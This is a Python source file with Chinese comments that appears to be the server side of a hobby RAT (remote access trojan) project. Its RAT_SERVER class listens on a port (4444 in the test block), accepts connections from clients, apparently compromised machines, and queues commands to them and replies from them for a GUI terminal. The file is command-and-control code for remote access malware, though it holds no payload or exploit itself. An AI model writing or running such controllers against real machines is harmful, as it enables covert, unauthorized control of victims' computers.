"""
Author: JFSAS
Date: 2024-12-4 23:02:00
Desicription: 服务端通信后端
"""
import socket
import tkinter as tk
import threading
from modules.terminal import Terminal
from queue import Queue
from typing import List, Tuple, Union, Generic, TypeVar
import threading
import logging

logging.basicConfig(level=logging.DEBUG)
class RAT_SERVER:
    '''
    RAT_SERVER类
    host: 服务端ip
    port: 服务端端口
    Public members:
        clients: 客户端列表,保存所有的连接客户端 结构：(client, ip, port, send_buf, recv_buf)
    Public methods:
        build_connection: 类的主线程，循环接受所有客户端连接
        get_client: 获取选择的客户端的信息，返回client, send_buf, recv_buf
    '''
    def __init__(self, host: str, port: int):
        '''
        Params:
            host: 服务端ip
            port: 服务端端口
        '''
        self.host = host
        self.port = port
        # 客户端列表
        self.clients = []
        # 回调函数，调用gui添加和删除客户端信息
        self.on_client_connected = None
        self.on_client_disconnected = None
    def build_connection(self, msg_queue: Queue):
        '''
        Description:
            类的主线程，循环接受所有客户端连接
            每接受到一个线程，创建一个线程处理子线程
        Params:
            None
        Return:
            None
        '''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        logging.debug(f"[*] Listening on {self.host}:{self.port}")
        while True:
            # 循环接受所有客户端连接
            client, addr = s.accept()
            # 接受到连接后，创建一个线程处理子线程
            client_thread = threading.Thread(target=self.handle_client, args=(client, addr, msg_queue))
            # 开启客户端处理子线程
            client_thread.start()

    def handle_client(self, client: socket.socket, addr: socket.AddressInfo, msg_queue: Queue):
        '''
        Description:
            处理一个客户端连接，每一个建立连接的客户端对应一个处理线程
        Params:
            client: 客户端socket
            addr: 客户端地址(ip, port)
        Return:
            None
        '''
        # 接受客户端ip
        ipcli = client.recv(1024).decode()
        # 将客户端信息加入到客户端列表
        self.clients.append((client, *addr, Queue(), Queue()))
        # 回调函数，添加客户端信息到gui
        # self.on_client_connected(*addr)
        msg_queue.put((addr))
        
        # TODO  心跳机制
        
        # 创建发送和接收线程
        send_thread = threading.Thread(target=self.send_msg, args=(self.clients[-1][3], client))
        recv_thread = threading.Thread(target=self.recv_msg, args=(self.clients[-1][4], client))  
        # 如果发送和接受线程有一个退出，关闭客户端连接
        send_thread.start()
        recv_thread.start()      
        recv_thread.join()
        client.close()
        send_thread.join()
        

    def get_client(self, ip: str, port: int) -> Tuple[socket.socket, Queue, Queue]:
        '''
        Description:
            根据ip，port获取对应的客户端信息(client, send_buf, recv_buf)
        Params:
            ip: 客户端ip
            port: 客户端端口
        Return:
            client: 客户端socket
            send_buf: 发送队列
            recv_buf: 接收队列
        '''
        for client, ip_tmp, port_tmp, send_buf, recv_buf in self.clients:
            # 如果找到对应的客户端，返回客户端信息
            if ip_tmp== ip and port_tmp == int(port):
                return client, send_buf, recv_buf
        raise Exception("Client not found")
    
    def close_error_client(self, ip: str, port: int):
        '''
        Description:
            出现问题，由后端关闭客户端连接
        Params:
            ip: 客户端ip
            port: 客户端端口
        Return:
            None
        '''
        self.close_client(ip, port)
        self.on_client_disconnected(ip, port)
        
    def close_client(self, ip: str, port: int):
        '''
        Description:
            关闭客户端连接
        Params:
            ip: 客户端ip
            port: 客户端端口
        Return:
            None
        '''
        for i in range(len(self.clients)):
            client, ip_tmp, port_tmp, send_buf, recv_buf = self.clients[i]
            if ip_tmp == ip and port_tmp == port:
                client.close()
                self.clients.pop(i)
                break
    
    
    
    
    def send_msg(self, buf: Queue, client: socket.socket):
        '''
        Description:
            发送消息线程,一直运行
        Params:
            buf: 发送队列
            client: 客户端socket
        Return:
            None
        '''
        while True:
            try:
                # 如果发送队列不为空，发送消息
                if buf.empty() is False:
                    msg = buf.get()
                    print(f"send {msg}")
                    client.send(msg)
            except Exception as e:
                # 出现异常，退出发送线程
                break
    
    def recv_msg(self, buf: Queue, client: socket.socket):
        '''
        Description:
            接收消息线程,一直运行
        Params:
            buf: 接收队列
            client: 客户端socket
        Return:
            None
        '''
        while True:
            try:
                # 接收消息
                msg = client.recv(1024)
                print(f"recv :{msg}")
                # 将消息放入接收队列(bytes)
                buf.put(msg)
            except Exception as e:
                break

# 测试
if __name__ == "__main__":
    host = "127.0.0.1"
    port = 4444
    rat = RAT_SERVER(host, port)
    rat.build_connection()